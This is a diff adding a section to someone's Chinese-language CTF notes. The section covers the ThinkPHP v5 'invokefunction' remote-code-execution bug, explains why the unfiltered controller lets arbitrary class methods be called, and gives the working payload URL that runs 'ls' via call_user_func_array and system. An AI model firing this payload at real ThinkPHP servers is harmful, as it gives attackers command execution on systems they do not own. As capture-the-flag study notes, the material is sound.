@@ -211,3 +211,20 @@ String.fromCharCode(55,56,54,79,115,69,114,116,107,49,50);
 ```
 
 - 得到：786OsErtk12
+
+# php_rce
+- 这道题是Thinkphp v5的一个getshell的漏洞
+- https://learnku.com/articles/21227
+- 因为这个漏洞，我们可以尝试传入默认的参数改变参数值来操作shell
+- 比如：`http://220.249.52.133:54736/?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ls`
+- 或者`http://220.249.52.133:54736/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ls`
+  - (不知为何，所有的wp都是这个操作，但是我做不到)
+- 接下来的事情就很容易了，无非就是输入linux指令
+- 接下来研究一下这个漏洞的原理
+  - ”在修复之前程序未对控制器进行过滤，导致攻击者可以通过引入 \ 符号来调用任意类方法。“
+  - 反斜线之后的，会被%name直接当成类名，且被实例化，这样就有可能直接调用类方法
+  - 比如：index.php?s=index/\namespace\class/method ，这将会实例化 \namespace\class 类并执行 method 方法。
+  - 在thinkphp中，因为有默认值的关系，直接对s进行操作：
+     - `http://220.249.52.133:54736/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ls`
+     - 对app实例化，然后执行后面的shellcode
+
